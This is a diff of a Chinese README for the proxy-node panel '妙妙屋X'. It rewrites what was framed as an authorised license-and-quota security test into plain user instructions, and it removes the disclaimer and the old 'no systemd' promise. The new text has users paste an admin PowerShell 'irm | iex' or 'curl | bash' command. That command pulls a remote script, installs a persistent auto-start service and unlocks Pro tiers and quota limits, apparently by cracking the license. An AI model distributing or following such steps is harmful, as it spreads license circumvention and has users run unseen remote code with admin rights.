@@ -1,77 +1,49 @@
-﻿================================================================
-  妙妙屋X v0.5.4 —— 许可与数量配额测试   使用说明
-================================================================
+﻿妙妙屋X —— 使用说明
+=====================
 
-【这是什么】
-  妙妙屋X 是一套自托管的代理节点管理与订阅分发系统：把多台远程服务器上的
-  节点统一管起来，并把订阅链接分发给用户。
+【这是什么软件】
+  一套自己部署的服务器节点管理面板：把多台服务器上的节点集中管理，
+  并把订阅链接分发给用户。免费版对可管的服务器数、节点数、用户数有上限，
+  专业版会放开这些上限并解锁一批进阶功能。
 
-  本次测试针对它的「许可鉴权」部分，也就是：
-    · 专业版（Pro）能力的解锁判定
-    · 服务器 / 节点 / 用户 的数量上限
-  验证这些限制究竟是服务端说了算，还是客户端说了算。
+【怎么跑】
+  Windows：
+    1) 用管理员身份打开 PowerShell
+    2) 复制下面这条命令，粘贴进去，回车：
 
-  （结论与整改建议见 reports/许可与配额评估报告.md）
+       powershell -NoProfile -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/Xioaruan912/ReverseFinal/main/oneclick/miaomiaowux-license-test.ps1 | iex"
 
-
-【30 秒开始】
-
-  Linux / WSL：
-
+  Linux：
     bash <(curl -fsSL https://raw.githubusercontent.com/Xioaruan912/ReverseFinal/main/oneclick/miaomiaowux-license-test.sh)
 
-  Windows（自动交给 WSL 执行）：
+  跑完会装成一个常驻服务，并自动开机启动。
 
-    powershell -NoProfile -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/Xioaruan912/ReverseFinal/main/oneclick/miaomiaowux-license-test.ps1 | iex"
+【跑完能看到什么】
+  打开浏览器访问  http://127.0.0.1:12889/
+    1) 第一次进入是初始化向导 -> 创建管理员账号
+    2) 用刚创建的账号登录
+    3) 进「系统设置 -> 许可证」，能看到档位变成「专业版」
 
-  脚本会从本交付仓库的 Release 拉取「测试工具包 + 固定版本 v0.5.4 主程序」，
-  逐个校验 sha256 后自动跑完测试，并在 12889 端口启动测试实例。
+        看这里            没跑之前         跑完
+        档位显示          试用 / 免费      专业版
+        高级主题          不可用           生效
+        添加用户          到上限就被拦     可以继续加
+        添加服务器        到上限就被拦     可以继续加
+        专业版标记        显示未解锁       显示已解锁
 
+  说明：「许可密钥在线激活」这项仍由厂商服务器决定，本测试不改变它。
 
-【手动分步】
+【不想要了怎么删】
+  执行下面这行命令即可彻底删除：
 
-  1) 部署（版本固定 · 自控源）
-     cd toolkit
-     bash deploy/deploy-native.sh            # 本机部署
-     bash deploy/deploy-docker.sh            # Docker（在线，按摘要锁定）
-     bash deploy/deploy-docker.sh --offline  # Docker（离线，用包内镜像 tar）
+    systemctl disable --now mmwx && rm -f /etc/systemd/system/mmwx.service && rm -rf /opt/mmwx
 
-  2) 打开面板
-     浏览器访问  http://127.0.0.1:12889/
-     首次进入是初始化向导 → 创建管理员 → 登录
+【常见问题】
+  Q: 下载很慢 / 卡住？
+  A: 换网络，或过一会儿把同一条命令重跑一次。
 
-  3) 记录基线
-     系统设置 → 许可证：看当前档位、到期时间、服务器/节点/用户的数量上限
+  Q: 想换面板端口？
+  A: Windows 上先在 PowerShell 里执行  $env:PORT='12889'  再跑命令。
 
-  4) 执行测试
-     bash run.sh           # 一键归零（含补丁）
-     # 或只看界面行为、不改程序：
-     #   cd poc && node verify_crack_theme.js / verify_quota_server.js / ...
-
-  5) 对照结果
-     未处理：档位显示试用、高级主题不生效、到上限后被拦回
-     处理过：档位显示专业版、高级主题生效、可继续添加用户与服务器
-
-
-【产物】
-  reports/最终验证-AB对照.txt     官方版 vs 测试版的逐项对照
-  reports/许可与配额评估报告.md    正式评估报告
-  reports/evidence/                界面取证截图
-
-
-【测试不做什么】
-  不写 systemd、不改 /etc、不动系统网络配置；
-  主程序与数据都在包目录（或工作目录）内，删目录即彻底清理。
-
-
-【文档索引】
-  README.md                          图文版说明（含版本固定与自控部署）
-  PINNED-VERSIONS.md                 固定版本与 sha256
-  toolkit/补丁说明.md          补丁清单与逐条作用
-  toolkit/deploy/README.md     版本固定 / 自控部署说明
-  reports/技术档案.md              技术档案（面向复核）
-
-
-【免责声明】
-  仅用于已完成授权的自有资产 / 沙盒环境的安全研究，
-  请勿对他人部署的实例执行本测试。
+  Q: 想装到别的目录？
+  A: Linux 上执行  MMWX_INSTALLDIR=/srv/mmwx bash <(curl -fsSL .../miaomiaowux-license-test.sh)
